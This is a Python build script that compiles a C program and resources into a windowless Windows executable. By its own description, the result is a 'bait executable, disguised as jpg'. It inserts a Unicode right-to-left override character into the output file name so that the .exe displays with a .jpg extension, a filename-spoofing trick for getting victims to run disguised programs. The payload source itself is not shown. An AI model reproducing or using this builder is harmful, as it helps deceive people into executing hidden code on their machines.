import argparse
import os, subprocess
import pathlib
parser = argparse.ArgumentParser(
                    prog='generate.py',
                    description='Generate a bait executable, disguised as jpg',
                    usage='generate.py -n myfilename')
parser.add_argument("-n", "--name")

def main():
    args = parser.parse_args()
    
    p = pathlib.Path(__file__).parent.resolve()

    subprocess.Popen(f'C:\\"Program Files (x86)"\\"Microsoft Visual Studio"\\2022\\BuildTools\\Common7\\Tools\\VsDevCmd.bat && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl runscript.c ..\\resources\\resources.res /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{args.name}‮gpj.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
    

if __name__ == "__main__":
    main()